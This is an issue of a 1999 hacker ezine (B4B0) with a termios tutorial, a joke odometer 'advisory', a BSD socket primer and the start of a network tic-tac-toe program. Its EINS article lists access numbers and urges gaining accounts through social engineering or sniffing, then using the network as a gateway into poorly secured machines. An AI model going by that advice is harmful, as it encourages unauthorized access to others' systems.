
                      [ The Resurrection of Vice ]

                               ,d$$$
  `$$Ss.                    .s`  $$$  $$$S$$$           sS$$   $Ss.
   `$$S$.                 .$'    $$$  $$$$$$'         .$$S'     `S$S.
    $$$$                 .$'     $$$  $$$$$'         .S$$'       `S$S.
    $$$$'              .d$'      $$$  $$$$'          $$$$         $$$$
    $$$$              .$S'       $$$  $$$$           $$$$         $$$$
    $$$$$SSSSSss.   .S$S'       .$$$  $$$$$s.        $$$$         $$$$
    $$$$$"~    `$Ss.`S$$        d$$$. $$$$S'~`~S$$Ss.$$$$         $$$$
    $$$$'        `$$Ss. $s.   .dS$$$$s.`~       "S$$Ss.$$         $$$$
    $$$$          $$$$$ $$$$$$$$$$$$$$$$$        `$$$$$s$         $$$$
    $$$$          $$$$$       `S$$$$' ssss         $$$$$$         $$$$
    $$$$          $$$$'         `$$$  $$$$         $$$$$$         $$$$
    $$$$.         $$$'           $$$  $$$$         $$$$$$         $$$$
    $$$$$b.    .,sS$'            $$$  $$$$         $$$$'$.       .$S$'
    `S$$$$$SsS$$$$$'            d$$$  $$$$$Ss. .sS$$$$'$SS.    .SS$'
                               d$$$$  `S$$$$$SsS$$$$"`  `S$$   $$S'
                             .d$$$$$
                             `$$$$$'
                                     `~~~

s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x

                   [ (c) 1999 The B4B0 Party Programme ]

s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x 6 s!x


 #$% [ Editor of This Issue ]................................. [ jorge ] %$#
 #@! [ Editor of Last Issue ]................................. [ Qytpo ] !@#


                                  [ Staff ]

    #@$ [ gRE-0p    ]--------------------------------------> ....gr1p $@#
    %!@ [ ge0rge    ]---  ---------   ---  ------       ---> ...jorge @!%
    *$% [ 4SseHm    ]---  --------    ---  ------  ---  ---> ...assem %$*
    *@! [ tEEp      ]---  -------  -  ---  ------  ---  ---> .....tip !@*
    ?#% [ kuR4cK    ]---       -  --  ---       -  ---  ---> ...chrak %#?
    W@& [ r4lph     ]---  ---  -        -  ---  -  ---  ---> ...r4lph &@W
    %$Z [ sEEgn4l   ]---  ---  -----  ---  ---  -  ---  ---> ....segv Z$%
    *%! [ thE MiLk  ]---       -----  ---       -       ---> .m1lkman !%*
    %!# [ 0hdaye    ]--------------------------------------> ...ohday #!%
    &%$ [ g4rEE-n00 ]--- ------- ------ ------ ------ -----> gary gnu $%&
    !@* [ jEEmEE    ]--------------------------------------> ...jimmy *@!



=-= [ B4B0 Official Linux Command of the Month ]----> ..........setfont sc.fnt
-=- [ B4B0 Official Site of the Month ]-------------> linuxwww.db.erau.edu/LPG
=-= [ B4B0 Official Idiot the Month   ]-------------> ............bronc buster
-=- [ Warriorised ]---------------------------------> ......www.antionline.com
=-= [ Fun         ]--------------------------->  fadetoblack.com/namegenerator
-=- [ More Fun    ]----------------------------->  taunting inmates while on a
                                                   prison tour
=-= [ Interesting ]----------------------------->  ..............reading b4b0!
-=- [ Dull        ]----------------------------->  ..................sektorgrl
=-= [ Gay         ]----------------------------->  ..........purple teletubbie
-=- [ Comedy      ]---------------------------->  so1o applied to ISS and sent
                                                them a list of sites he hacked


"I got in trouble thanks to b4b0..."

"Oh? How's that?"

"Well, i was in class on a computer, and i went to www.b4b0.org.  When it
loaded, the shit said 'Bitch, I'll fuck yo ass up!' and the speakers were on
high. "

"Sorry."



[] =-=-=-=-=-=-=-=-=-=-=-= [ table of contents ] =-=-=-=-=-=-=-=-=-=-=-= []

[ 1]==[ Editor's Words                            ] [ jorge     ]==[ 1]
[ 2]==[ Terminal I/O Library                      ] [ assem     ]==[ 2]
[ 3]==[ B4B0 Advisory                             ] [ B4B0      ]==[ 3]
[ 4]==[ EINS and the z39.50 Protocol Suite        ] [ gr1p      ]==[ 4]
[ 5]==[ Intro to *BSD Socket Layer Internals      ] [ jayenz    ]==[ 5]
[ 6]==[ Ripping Skills Elite  (phusnttt.c)        ] [ phusnkin  ]==[ 6]
[ 7]==[ Quick and Dirty Intro to Message Queues   ] [ Canul     ]==[ 7]
[ 8]==[ B4B0 Linux x86 ASM Codez                  ] [ chrak     ]==[ 8]
[ 9]==[ ISS Company Secret Warez                  ] [ *         ]==[ 9]
[10]==[ Idiocy on Dialouts / Dialout Info         ] [ jorge     ]==[10]
[11]==[ DethCraze's Ezine, issue 01               ] [ DethCraze ]==[11]

  [ Other stuff in this issue of b4b0 ]

[ in warez ]:
[  ]==[ gjp.tgz, Gay Juarez Project                ] [ *        ]==[  ]
[  ]==[ jester.tgz, The Jester Project             ] [ Team QOS ]==[  ]
[  ]==[ qps.c, Scanner                             ] [ KKR      ]==[  ]
[  ]==[ server.c, Gummo Backdoor Server            ] [ ph1x     ]==[  ]
[  ]==[ termios.tgz, Accompanying Code to Article  ] [ assem    ]==[  ]

                                .  .  .

     "What's the point of a government when they want to govern me?"
                                     -- Pennywise



!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0[ 1 ]b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0

                               Editors Words.
Hi.

We've had some rough times in b4b0.  No matter we stick-and-move and continue
on. Thiz issue seriously kicks ass. We've got everything from stolen ISS warez
to tampax dox. so1o might even have a 'guest appearence' h0h. Fear. Anyways.
Enjoy.

--jorge



!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0[ 2 ]b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0

                         TERMINAL I/O LIBRARY
                           assem <assem@hom.net>

                          [ SEE termios.tgz ]


        The termios library is a POSIX compatible frontend for otherwise,
unportable ioctl() calls.  In the late 1970's, System III developed a different
set of terminal routines from Version 7.  System V continued to hold these same
System III routines while Berkeley systems used the Version 7 routines.  This
article is an introduction to the termio library and some of the aspects and
resources you can use with it.

        Terminal I/O consists of two modes:

1.      Canonical mode -> line processing, read() reads at most one line
                          per call.

2.      Noncanonical mode -> data is not assembled into lines.

        If you have ever tinkered with some programming and input requests I'm
sure you have noticed that your fgets() and scanf("%s", buffer); reads a line
with \n\0 trailing the data.  This is canonical mode.  You also may have heard
of getch() which uses noncanonical mode, reads() one character per call.

        Let's draw a couple of conclusions... since all of the read requests
you call that read from stdin (standard input) are canonical based, and only
getch() appears to be noncanonical, wouldn't you assume canonical is default?

        Yes, it is.

        The text editor I am writing this article in (emacs), at the touch
of my fingertips to the keyboard I see the key I stroked appear on my
screen.  I haven't hit carriage return yet, therefore, wouldn't emacs be
noncanonical based?  Yes, it is, and so are most (if not all) text editors.

        That wasn't too hard, was it?  Let's get down to the termios functions.

NOTE:  This article probably won't be advantagous to you unless you are
looking for examples of termios code to play with or you are a complete
moron.  This is basically manual (man) pages with slightly more
comprehensible language (or maybe not?).

#include <termios.h>

struct termios  {
       tcflag_t c_iflag;        /* input flags */
       tcflag_t c_oflag;        /* output flags */
       tcflag_t c_cflag;        /* control flags */
       tcflag_t c_lflag;        /* local flags */
       cc_t  c_cc[NCCS];        /* control characters */
};

speed_t     cfgetispeed(const struct termios *term);
speed_t     cfgetospeed(const struct termios *term);
int         cfsetispeed(struct termios *term, speed_t speed);
int         cfsetospeed(struct termios *term, speed_t speed);
int         tcdrain(int fd);
int         tcflow(int fd, int action);
int         tcflush(int fd, int queue);
int         tcgetattr(int fd, struct termios *term);
int         tcsendbreak(int fd, int duration);
int         tcsetattr(int fd, int opt, const struct termios *term);


        Hey not too much, eh?

        Let's take a look at the members of the termios structure and
the flags that are behind it.

*** NOTE ***
These the the POSIX.1 flags only!


struct termios  {
        tcflag_t        c_iflag;
BRKINT                generate SIGINT on BREAK
ICRNL                map CR (carriage) to NL on input
IGNBRK                ignore BREAK
IGNCR                ignore CR
IGNPAR                ignore characters with parity errors
INLCR                map NL to CR on input
INPCK                enable input parity checking
ISTRIP                strip eighth bit off input characters
IXOFF                enable start/stop input flow control
IXON                enable start/stop output flow control
PARMRK                mark parity errors

        tcflag_t        c_oflag;
ONOEOT                discard EOTs on output  (^D)

        tcflag_t        c_cflag;
CLOCAL                ignore modem status lines
CREAD                enable receiver
CSIZE                character size mask
CSTOPB                send two stop bits, else one
HUPCL                hangup on last close
PARENB                parity enable
PARODD                odd parity, else even

        tcflag_t        c_lflag;
ECHO                enable echo
ECHOE                visually erase characters
ECHOK                echo kill
ECHONL                echo NL
ICANON                canonical input
IEXTEN                enable extended input character processing
ISIG                enable terminal-generated signals
NOFLSH                disable flush after interrupt or quit
TOSTOP                send SIGTTOU for background output

        cc_t                c_cc[NCS];
CR                carriage return         \r        (can not change)
EOF                end of file
EOL                end of line
ERASE                backspace            ^H
INTR                interrupt, SIGINT     ^C
KILL                delete line           ^U
NL                linefeed                \n        (can not change)
QUIT                quit                  ^\
START                resume output        ^Q
STOP                stop output           ^S
SUSP                suspend               ^Z

*** NOTE ***
By inserting a 'V' in front of the before mentioned control characters
(i.e. VEOF) you have the subscript you use to reference and change the
control character values...
example:

term.c_cc[VEOF]                = 1;
};

        Alright, now that we've gone over the various flags and control
characters let's play with the terminal settings.  tcgetattr() and
tcsetattr() are the get terminal and set terminal attributes calls.  Let's
review the calls real quick first.

int tcgetattr(int fd, struct termios *term);
int tcsetattr(int fd, int opt, struct termios *term);

opt is specified as one of the following:
TCSANOW          -  Change occurs immediately.
TCSADRAIN        -  Change occurs after all output has been transmitted.
                    Use if you are changing the c_oflag parameters.
TCSAFLUSH        -  Occurs after all output has been transmitted.  When
                    change takes place all input in the queue that is
                    un-read is flushed.

Both return 0 if successful, -1 on failure.

Here is an example of dos and curses's library routine, getch().

(see getch.c)

Now, let's review the library...

int tcgetattr ( int fd, struct termios *termios_p );

        tcgetattr () fills the ptr to the termios structure using the
object associated with fd.

EXAMPLE:
struct termios        term;
if (tcgetattr(fileno(stdin), &term) < 0)  die("tcgetattr broke!");

int tcsetattr ( int fd, int optional_actions, struct termios *termios_p );

        tcsetattr () uses the information stored in the ptr to termios to
set the terminal characteristics of the object associated with fd.

EXAMPLE:
struct termios term;
if (tcgetattr(fileno(stdin), &term) < 0)  die("tcgetattr failed!");
term.c_cc[VINTR] = 7;        /* interrupt control character becomes ^G */
if (tcsetattr(fileno(stdin), TCSANOW, &term) < 0)  die("tcsetattr failed!");

int tcsendbreak ( int fd, int duration );

        tcsendbreak () generates a BREAK to the object associated with the
descriptor for duration.

int tcdrain ( int fd );

        tcdrain () waits until all output written to fd has been
transmitted.

EXAMPLE:
#define flush(x) tcdrain(x)
flush(fileno(stdout));

int tcflush ( int fd, int queue_selector );

        discards data written but not transmitted or data received but not
read, depending on queue_selector.

queue_selector can be set to these values:
TCIFLUSH        -        flushes data received but not read.
TCOFLUSH        -        flushes data written but not transmitted.
TCIOFLUSH       -        TCIFLUSH and TCOFLUSH

EXAMPLE:
tcflush(fileno(stdout), TCIOFLUSH);

int tcflow ( int fd, int action );

        tcflow () stops or resumes transmission or reception of data to
and from the system.

EXAMPLE:
extern char sLock = 0;
void scroll_lock()
{
        switch(sLock)  {
                case '0':
                        if (tcflow(fileno(stdout), TCOOFF) < 0)
                                die("tcflow died!");
                        sLock = 1;
                        break;

                case '1':
                        if (tcflow(fileno(stdout), TCOON) < 0)
                                die("tcflow died!");
                        sLock = 0;
                        break;

                default:
                        die("internal error!");
                        break;
        }
}

int cfmakeraw ( struct termios *termios_p );

        cfmakeraw () sets the terminal attributes as follows:
                   termios_p->c_iflag &= ~(IGNBRK|BRKINT|PARMRK|ISTRIP
                                   |INLCR|IGNCR|ICRNL|IXON);
                   termios_p->c_oflag &= ~OPOST;
                   termios_p->c_lflag &= ~(ECHO|ECHONL|ICANON|ISIG|IEXTEN);
                   termios_p->c_cflag &= ~(CSIZE|PARENB);
                   termios_p->c_cflag |= CS8;

speed_t cfgetospeed ( struct termios *termios_p );
speed_t cfgetispeed ( struct termios *termios_p );

        cfgetospeed () returns the output baud rate stored in the termios
structure.

        cfgetispeed () return the input baud rate stored in the termios
structure.

EXAMPLE:
tcgetattr(fileno(stdin), &termin);
tcgetattr(fileno(stdout), &termout);
printf("terminal baud rate..\ninput: %q\noutput: %q\n",
        cfgetispeed(&termin), cfgetospeed(&termout));

int cfsetospeed ( struct termios *termios_p, speed_t speed );
int cfsetispeed ( struct termios *termios_p, speed_t speed );

        cfsetospeed () sets the terminal output baud rate.

        cfsetispeed () sets the terminal input baud rate.

EXAMPLE:
tcgetattr(fileno(stdin), &termin);
tcgetattr(fileno(stdout), &termout);
cfsetispeed(&term, B57600);
cfsetospeed(&term, B57600);


        Included in the file I have compiled a few functions to set
certain terminal modes and a few macros and functions to play with various
of the before mentioned terminal modes.

(see aterm.h)

        This article was written as a learning experience for myself and
for others over the terminal input/output library, termios.  Some of the
code is untested and I am human so I am likely to have errors in my
article, please email assem@hom.net with any errors you find and if you
feel like it, a correction.

- assem
email: assem@hom.net
web: http://weapons.org

                              .  .  .

<Interrupt> if you think I am a moron go to www.hackphreak.org and read my
            lecture
<Interrupt> then say I am a moron
<Interrupt> joeshmoe: no, I do not code in C I only shell script
<Interrupt> umm, ever heard of .bat files?


!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0[ 3 ]b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b


                b4b0 advisory [ Odometer Exploit ] [ Feb 3 1999 ]


-- Platform:    1975 Volvo 244 DL

-- Program:     Odometer and Tripometer

-- Info:        This advisory is in memory of atreyu (loser extraordinaire)
                and Sheepie/Phartmang the old 2600 bots.

-- Synopsis:    A vulnerability exists in the 1975 Volvo 244 DL's odometer
                and tripometer, making the car seem more elite than it is,
                possibly forcing the administrator to buy a Saturn.

-- Exploit:     This vulnerability should be widely distributed to
                all security experts because b4b0 knows that the average
                BUGTRAQ reader's favorite car is a vintage Volvo.

                The Volvo's odometer and tripometer work in conjunction
                with one another to keep track of the miles an administrator
                spends driving between home, work (to reboot the NT boxes
                for their lazy admins), and Taco Bell (Yo Quiero b4b0). Using
                a sophisticated piece of equipment (ie paperclip, wood chunk,
                pencil), one can exploit the odometer so that it does not
                track the mileage.

                The exploit is simple yet evasive. By compressing the button
                to "reset" the tripometer, the device is rendered useless. If
                left in the compressed position, the odometer will not work.

-- Fixes:       To follow b4b0's workaround tradition, we recommend that
                you downgrade to a Ford Pinto or make the ultimate purchase
                of a Saturn.


                             .  .  .

             <t00neses> is there a netscape that I can use on a shell?
                        I hate this lynx shit with no pictures


!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0[ 4 ]b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0

                         EINS and the z39.50 Protocol Suite.
                                 <gr1p@b4b0.org>

Please Excuse any mistakes, I wrote this when stoned.
Werd to dgm for letting me use his computer and smoking with me. :>

--> What is EINS?

EINS, or European Information Network Services exists to provide the
transport of data services to scientific and technological research
centres across Europe, including the European Space Agency (ESA).  EINS is
technically a series of interlinked information servers linked together to
ensure distribution and availiability of research data.

EINS is networked using a gateway designed by the ESA called the MIRO
Gateway, this uses and basically enhances the Z39.50 protocol suite for
information retrival.

--> Z39.50 protocol

The z39.50 Protocol Suite is probably one of the best Protocol suites for
Information Retrival to be used on a research scale.  The main reason
behind this is that the z39.50 protocol suite incorporates many other
protocols into its own suite, allowing co-existence between many protocols
for data-retrival and posting.  Today it is commonly used among the
large and more famous Libraries for exchange of bibliographical data as
well as establishments already stated.

The z39.50 protocol suite works on the basis of TCP/IP which is used for
the Internet.  Any network encorporating TCP/IP can provide a means of
transport for a machine using the z39.50 protocol.

The z39.50 protocol has a number of services defined within the protocol
which users can make use of.

- Initialisation Service

This sets up connections ready for data transfer.

- Search Service

This enables the user to search for data on machines connected using
z39.50,  This service also deals with the relaying of data and sorting of
search resuls.

- Present Service

This is a definition of the Search Service for how much data is to be
transferred, and in what order etc.

- Access Control

This exists as the protocol's main security control, deals with login
passwords, copyright of data etc.

- Resource Control

Although this service is not always used, it acts as supervision, ie. an
admin can restrict which data resources users have access to and download
rates etc.  This is mainly used in Academic Establishments where large
amounts of users requires tighter control of resources.

- Delete Service

This service exists to allow users access to delete records.

- Extended Services

Extended services include the 'help' facility which can guide users on how
to operate the search facilities etc.

The z39.50 protocol as used in EINS is slightly different than the
original RFC draft for the implementation of the z39.50 protocol suite,
although this original draft has now evolved into EINS as this is the
primary network encorporating z39.50.

EINS uses the MIRO gateway to transfer data on top of the original z39.50
protocol.  More about the MIRO Gateway can be found in the next section.

--> MIRO Gateway

The MIRO Gateway is used in EINS to interlink several European Information
Service Networks and encorporating them all into one network using the
MIRO Gateway.  It makes it possible for users of any of the network
services to access databases and other networked information.

The advantages of the EINS, and the reason for its popularity among
scientific and academic research establishments is that, because of the
MIRO Gateway, the best information networks are linked into one resulting
in far more data from different networks being made availiable for the
users.

Fig. 1 below helps demonstrate the network architecture of EINS under the
MIRO Gateway.  I have broken the diagram into 5 sections, labelled 1-5 for
ease of explanation.

- Fig 1. - MIRO System Architecture

              -----       -----        ----------
- 1 -        | ERN |     | PSN |     | Internet |
              -----       -----       ----------
               \            |            /
                \           |           /
                 \          |          /
                  \         |         /
                   \        |        /
                    \       |       /
                     \      |      /
                      \     |     /
                       \    |    /
                        \   |   /
                         \  |  /
                          \ | /
                            |
                            |
                      --------------
- 2 -                | MIRO Gateway |
                      --------------
                            |
                            |
                            |
                     ---------------
- 3 -               | Origin Server |
                     ---------------
                            |
                            |
                    -----------------
                   |                 |
- 4 -              | Z39.50 Protocol |
                   |                 |
                    -----------------
                   /        |        \
                  /         |         \
                 /          |          \
                /           |           \
               /            |            \
              /             |             \
             /              |              \
            /               |               \
      -------------    -------------    -------------
- 5 -| MIRO Target |  | MIRO Target |  | MIRO Target |
      -------------    -------------    -------------

1 - This layer shows the original networks used to compile the data of
    EINS.

    ERN - European Research Networks, used for data transfer between
          Academic, Technological and Scientific Establishments.

    PSN - Packet Switching Networks, such as GNS Dialplus, Sprintnet,
          JANET, and other European/International networks, usually
          encorporating the x.25 protocol.

   Internet - The final network for data collection.  The Internet, with
              vast amounts of data for research use (the most favoured
              network nowadays).

2 - The MIRO Gateway acts as a sort of proxy to allow users access EINS to
    gather Information from the networks discussed in Section 1 of the
    diagram.

    The MIRO Gateway builds in efficient data collecting techniques,
    developed by The European Space Agency (who themselves are connected
    to EINS).  It uses a transparent command language to ease output
    formatting, and access accounting.

3 - The origin server is the primary machine used in the EINS.  It is of
    course named, EINS, and it is this machine that is accessed for
    entry to the data and records stored on EINS.

4 - From this section of the diagram, the network flow turns direction,
    as machines accessing EINS or, as labelled on the diagram, The Origin
    Server use z39.50 to access the public data and search through it with
    ease.  Look under the 'z39.50 Protocol' section for more information
    on how the z39.50 protocol operates.

5 - MIRO Targets are simply the machines accessing EINS requesting data
    transfer/recieval.

--> Accessing EINS

There are actually quite a few ways to access EINS.  As EINS gathers
information from so many sources, it has network compatibility with so
many different protocols therefore allowing access from so many different
networks.

- Firstly, and formost, EINS is accessable via telnet.  Although I have
  never personally accessed via telnet it is availiable to users at the
  address telnet.eins.org although this may be rather slow.

- EINS is also connected to GNS Dialplus, a .uk network encorporating
  the x.25 protocol.  GNS Dialplus is, in my opinion, a more safer way to
  access EINS if you are doing anything naughty, although I am not saying
  you should. :>

  However, access to GNS Dialplus is probably only useful if you are in
  the United Kingdom.  Here are some access numbers for GNS Dialplus for
  you lovely Brits:-

  London ------> 0181 810 5576
  Manchester --> 0161 834 4543
  Birmingham --> 0121 643 6521
  Bristol -----> 0117 929 3772
  Glasgow -----> 0141 221 5851
  Leeds -------> 0113 245 8213
  Edinburgh ---> 0131 313 3721
  Cambridge ---> 01223 844 597
  Reading -----> 01734 394 452

  EINS is located on GNS Dialplus as the address EINS-QUEST and takes you
  to exactly the same machine as telnet.eins.org does (naturally).

- Access to EINS is also possible via Sprintnet on the NUA 022226410174,
  although I have personally never tried this NUA I am told that it is
  valid for access to EINS.

There are many other ways to access EINS via networks around Europe and
The World, I guess the best idea is to scan for them.  Try looking around
JANET for a gateway perhaps.

--> Exploring EINS

To explore EINS you will need an account on the system to access the data.
Try your basic social engineering techniques to gain accounts, or find a
machine using EINS and sniff the traffic on the machine using a packet
sniffer tool, the possiblities are endless,  you're the hacker, figure it
out.

Upon connection to EINS, however you choose to connect, you will be presented
with a login screen, asking you to enter your valid QUEST-ID.  This is you
authentication code to gain access to EINS.  So go be a hacker and get
some kodes. :>

To explore EINS to its maximum potential it will be very useful (essential
even) to know the basic simple commands for navigating EINS.  The commands
used in EINS are abbreviations of words, and enable you to take complete
control over your time navigating EINS.  Below is a list of the commands,
along with uses and definitions.  This command list was adapted from the EINS
command list found in The British Library.

1 - Entering Files.

- BEGIN

  This command is used to begin searching the EINS.  It kills any previously
  open search process and starts fresh.  The abbreviation for this command
  is simply the letter 'b'.

  eg. B hack

  This command line would open a new query file recorded as 'hack'.

2 - Searching

- SELECT

  This command enables you, the user, to define search strings,  limit your
  search results etc.

  eg. S space

  This command line would set search select on topics involving space.

  eg. S 2/98-99

  This command line would limit data search for files created between 2/98
  and 2/99.

- EXPAND

  The Expand command enables you to expand you search strings and pull more
  data from relative places.

  eg. E space

  This command line would expand on the search results found in the string
  space.

- DELETE

  The Delete command enables the user to delete specific search sets.

  eg. DELETE ALL

  THis command line would delete all open search files.

3 - Looking at References

- PRINT

  The Print command enables you to send search references to a specified email
  address.

  eg. PR kodez EMAIL=gr1p@b4b0.org

  The above command would send the search reference data called kodez to
  gr1p@b4b0.org.

- DOWNLOAD

  This command would allow you to save search references to a file on your
  machine.

  eg. DL zerodayz /home/gr1p/zero.txt

  The above command will save search reference 'zerodayz' output to
  /home/gr1p/zero.txt.

- SAVE

  The alternative to the download command is SAVE.  Both provide the same
  function to the user, although download seem's to be prefered for more
  portable saving options.

  eg. SAVE hacker

  This would simply save the search reference list 'hacker' to your 'search
  favourites' list.


4 - Other Commands

- HELP

  Help is provided as part of EINS.  THis will enable you to grasp much
  greater control over the commands in use of EINS.  It is recommended
  that HELP is looked at when in doubt.

  eg. HELP <COMMAND>

  Will give you help on how to make greatest use of the command.

- LOGOFF

  Logoff simply log's you off your EINS session.

  eg. LOGOFF

--> End

You may be asking, "what use does this have for me, the typical network
hacker?"

Well, the answer is simple, because of the large amount of data networks
linked to form EINS, there are a large amount of machines, many of these
machines will have poor security, world-readable/writable files, password
information in readable files etc.  You could even do searches for open
x.25 gateways, access numbers to networks etc.  The possiblities are
endless and from this information you could gain entry to numerous
machines connected to networks worldwide.

Although I am in no way condeming the use of EINS as a gateway to other
networks, nor am I saying I have done it, I am simply suggesting
possiblities. :>

gr1p@b4b0.org


!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0[ 5 ]b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0

                  Intro To *BSD Socket Layer Internals
                                by jayenz

    The socket layer deals with IPC at the system. The network subsystem
is generally divided into 3 layers: transport, network, and
network-interface layer.  The layers are respective to the transport,
network, and link layers of the OSI model.  Data is received at the
network interface and is moved up the layers until it is placed in a
recieve queue for the dest socket.  Primary focus is put on the socket
layer workings.  All examples done from a NetBSD box, so some things may
not be the same for linux (specifically the Mbuf stuff, check out
<linux/skbuff.h>).

    The highest layer of the network subsystem, the transport layer or
socket layer, works by using what is called a "socket data structure"
that is loaded dynamically by malloc().  Socket data structures take the
following form (from <sys/socketvar.h>):

---`BEGIN CODE`---

struct socket {
        short   so_type;             /* generic type, seesocket.h*/
        short   so_options;          /* from socket call,seesocket.h*/
        short   so_linger;           /* time to linger while closing*/
        short   so_state;            /* internal state flags SS_*,
below */
        void    *so_pcb;             /* protocol control block */
        struct  protosw *so_proto;   /* protocol handle */

/*
 * Variables for connection queueing.
 * Socket where accepts occur is so_head in all subsidiary sockets.
 * If so_head is 0, socket is not related to an accept.
 * For head socket so_q0 queues partially completed connections,
 * while so_q is a queue of connections ready to be accepted.
 * If a connection is aborted and it has so_head set, then
 * it has to be pulled out of either so_q0 or so_q.
 * We allow connections to queue up based on current queue lengths
 * and limit on number of queued connections for this socket.
 */

        struct  socket *so_head;     /* back pointer to acceptsocket*/
        struct  soqhead *so_onq;     /* queue (q or q0) that we'reon*/
        struct  soqhead so_q0;       /* queue of partial connections*/
        struct  soqhead so_q;        /* queue of incomingconnections*/
        TAILQ_ENTRY(socket) so_qe;   /* our queue entry (q or q0) */
        short   so_q0len;            /* partials on so_q0 */
        short   so_qlen;             /* number of connections onso_q*/
        short   so_qlimit;           /* max number queuedconnections*/
        short   so_timeo;            /* connection timeout */
        u_short so_error;            /* error affecting connection */
        pid_t   so_pgid;             /* pgid for signals */
        u_long  so_oobmark;          /* chars to oob mark */
/*
 * Variables for socket buffering.
 */
        struct  sockbuf {
                u_long  sb_cc;          /* actual chars in buffer */
                u_long  sb_hiwat;       /* max actual char count */
                u_long  sb_mbcnt;       /* chars of mbufs used */
                u_long  sb_mbmax;       /* max chars of mbufs to use */
                long    sb_lowat;       /* low water mark */
                struct  mbuf *sb_mb;    /* the mbuf chain */
                struct  selinfo sb_sel; /* process selecting
                                                 read/write */
                short   sb_flags;       /* flags, see below */
                short   sb_timeo;       /* timeout for read/write */
        } so_rcv, so_snd;
};

---`END CODE`--

As you can blatantly see, there are structs for both the send and
recieve buffers.  A socket data structure is setup when socket(2) is
called.  After it is called, the member caddr_t f_data;  /* vnode or
socket */  of the kernel descriptor table struct (<sys/file.h>) points
to the socket structure.  This is somewhat parallel to the vnode struct
that is used with filesystems.

NOTE: The "so" prefix the struct members is used to denote that it is a
second-level routine. i.e. sobind(), solisten().

Ok.

The data is stored in the sockbuf queue as a chain of mbufs (mbufs
covered later).  Data enters the system via systems calls like send(),
and is passed as a chain of mbufs to be sent outward over the interface.
Data recieved is passed to the socket layer in mbuf chains where they are
held until requested.  Hi and low watermarks are used to control the flow
of data.  These watermarks control the
operation of the select(2) sytem call for testing whether the socket is
ready for reading and writing.  the socket data structure must maintain
the queues of messages being sent and received by the socket. mbufs take
care of this.

The separate queues for incoming and outgoing messages are stored in
their own data structures called "Mbufs".  the Mbuf data structures
generally take the following form:

struct mbuf {
        struct  m_hdr m_hdr;
        union {
                struct {
                        struct  pkthdr MH_pkthdr;     /* M_PKTHDR set */
                        union {
                                struct  m_ext MH_ext; /* M_EXT set */
                                char    MH_databuf[MHLEN];
                        } MH_dat;
                } MH;
                char    M_databuf[MLEN];              /* !M_PKTHDR, !M_EXT */
        } M_dat;
};

[...]

struct m_hdr {
        struct  mbuf *mh_next;          /* next buffer in chain */
        struct  mbuf *mh_nextpkt;       /* next chain inqueue/record*/
        caddr_t mh_data;                /* location of data */
        int     mh_len;                 /* amount of data inthismbuf*/
        short   mh_type;                /* type of data in this mbuf*/
        short   mh_flags;               /* flags; see below */
};

Mbufs are 128 bytes long and use 100-108 bytes specifically used for
data storage.  Messages read over the socket can be stored in a single
mbuf structure under the conditions that message <= 108 bytes. If not
(blargh), you can use an external mbuf cluster for the rest of the data.

operation of socket layer in associating two processes

a foreign client starts an active open, and the server will passively
accept connections. the sockets are created by users with the socket(2)
system call, and created internally by the socreate() routine.  the
socreate() routine allocates the space for the socket data structure
talked about above.  after socreate(), the address is bound internally
by the sobind() routine.  if the protocol isnt a connectionless one, a
PRU_LISTEN request is sent the protocols to set the backlog on the
socket.  to now accept connections, accept() must
be called which internally invokes the soaccept() routine.

on the client side, an soconnect() is done internally for the regular
connect() to establish a connection.  this inturn sends a PRU_CONNECT
request to the protocol.  after the initial soconnect(), an
soisconnecting() is issued to initiate the 3-way handshake if we are
dealing with tcp.

after the connection has been established, data must be transfered.
sosend() is used internally to copy data from the process's addess space
in to the mbufs.  afterwords it is moved down through other layers and
sent outwards on the interface.  on recieving the sent data, it is sent
to the remote interface, up the different layers with each layer taking
off its own header, i.e( IP, TCP headers).  the data is then copied onto
the socket's input queue (in our case so_rcv, see above).  after on the
queue, the sorecieve() routine can copy the data out to be read by the
read() syscall.

termination

to end the communication between the two sockets, the soshutdown()
routine is called.  this will flush the recieve buffer and mark the
socket as not able to recieve anymore data.  A PRU_SHUTDOWN request is
sent to the protocol.  the connection is now dead.

this was just a brief intro, if you want more info go get a book
-jayenz

(modu1e@hotmail.com)


!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0[ 6 ]b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b0!b4b

Strange, this looks a LOT like r4lphs nttt.c... el8.

/*
 * phusnttt.c - TCP/IP TIC TAC TOE by phusnikn #decepticons or #linuxwarez
 *          You guessed it. Tic tac toe, taken to the next level. Play your
 *          friends, play your mom, even play so1o! Works on *BSD* and Linux
 *          as far as I know. Mail phusnikn@usa.net if it works on your non
 *          *BSD*\Linux system. If you don't like something in the code,
 *          for christs sake, don't tell me, just change it. Don't distribute
 *          modified versions, blah blah blah. The connector will always be
 *          X and the connected to will be O.
 *
 *          DO NOTTT RUN THIS FUCKING PROGRAM AS ROOT. DONT GET OWNED BY
 *                                     STUPIDITY.
 * compile: gcc -O2 -o nttt nttt.c
 * Have fun.
 * 12/31/1998
 * phusnikn@usa.net
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

/* defines */
#define X 1
#define O 0
#define PORT 1999 /* Note Server/Client must use the same port. */

/* color defines  1;31 1;32 1;34 */
#define END                " [0m"
#define RED                " [1;32m"
#define GREEN              " [1;30m"
#define BLUE               " [1;36m"
#define BOLDWHITE          " [38m"
#define BGRED              " [1;41m"

/* function prototypes */
int main(int argc, char *argv[]);     /* duh */
unsigned long getip(char *hostname);  /* resolve hostname */
